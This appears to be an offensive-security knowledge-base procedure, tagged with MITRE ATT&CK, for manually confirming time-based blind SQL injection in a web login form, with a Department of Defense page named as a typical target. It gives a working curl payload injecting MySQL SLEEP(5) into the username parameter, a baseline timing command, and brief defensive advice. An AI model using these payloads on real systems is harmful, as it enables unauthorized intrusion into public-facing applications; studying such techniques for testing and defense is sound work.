---
id: proc-uuid-1
tags:
  - sqli
  - blind-sqli
  - time-based
  - manual-testing
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-manual-sqli-poc]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:46:20.026Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Manual-Time-Based-SQLi-Verification

## Summary

This procedure manually verifies a time-based blind SQL injection vulnerability in a web login form by injecting a MySQL SLEEP function payload into the username parameter, observing a response delay to confirm the injection point without extracting data directly.

## Description

In a typical attack scenario on a public-facing web application like a Department of Defense login page, attackers test for SQL injection by crafting inputs that alter query execution time. Here, the /olc/setlogin.php endpoint processes POST data for username and password without sanitization, allowing direct SQL concatenation. A successful injection causes a 5-second delay, proving blind SQLi without visible errors, setting the stage for automated exploitation.

## Requirements

1. Network access to the target HTTPS endpoint on port 443
2. Tool like curl for sending POST requests
3. Basic knowledge of SQL syntax and HTTP requests

## Defense

Defensive measures and detection strategies:

- Implement prepared statements or parameterized queries in PHP to prevent injection
- Use web application firewalls (WAF) to detect anomalous payloads like SLEEP functions
- Monitor application logs for unusual response times or failed logins

## Objectives

1. Confirm SQL injection vulnerability in username parameter
2. Validate time-based blind technique applicability
3. Establish proof-of-concept for further automated attacks

## Instructions

### Step 1: Craft and Send Injection Payload

**Context**: Prepare a POST request with a username payload that injects a subquery using MySQL's SLEEP(5) to induce a delay, while keeping password neutral.

**Command** ([[commands/curl-manual-sqli-poc]]):
```bash
curl -X POST https://target.com/olc/setlogin.php -d "username=admin'+(select*from(select(sleep(5)))a)+'&password=pass" -v
```

> This command sends the payload via curl, appending verbose output (-v) to observe timing. The payload closes the string with ' and injects a sleep subquery. Expected output includes a normal response but with a ~5-second delay, confirming the database executes the injected code.

### Step 2: Compare Response Times

**Context**: Run a baseline request without payload to measure normal response time, then compare with the injected one.

**Command** (Baseline):
```bash
curl -X POST https://target.com/olc/setlogin.php -d "username=admin&password=pass" -w "%{time_total}\n" -o /dev/null
```

> Use -w for timing output. Normal response should be under 1 second; injected one delays by 5 seconds, indicating success.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-manual-sqli-poc]]

## Tools Used


## Tags

- sqli
- blind-sqli
- manual
